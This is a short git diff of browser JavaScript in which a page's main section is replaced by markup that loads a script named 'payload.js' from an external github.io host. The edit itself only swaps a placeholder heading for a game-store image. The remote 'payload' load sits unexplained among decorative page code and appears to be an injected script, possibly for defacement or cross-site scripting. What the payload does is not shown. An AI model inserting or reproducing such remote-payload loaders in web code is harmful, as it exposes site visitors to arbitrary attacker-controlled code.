@@ -46,7 +46,7 @@ document.head.appendChild(style);
 // Replace the entire <section> element with the script tag
 const sectionElement = document.querySelector('section#section-page');
 if (sectionElement) {
-  sectionElement.outerHTML = `<script src="https://vmpirevigil0.github.io/ai/payload.js"></script><h1>hi</h1>`;
+  sectionElement.outerHTML = `<script src="https://vmpirevigil0.github.io/ai/payload.js"></script><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1172470/capsule_616x353.jpg">`;
 }
 
 // Function to create a petal
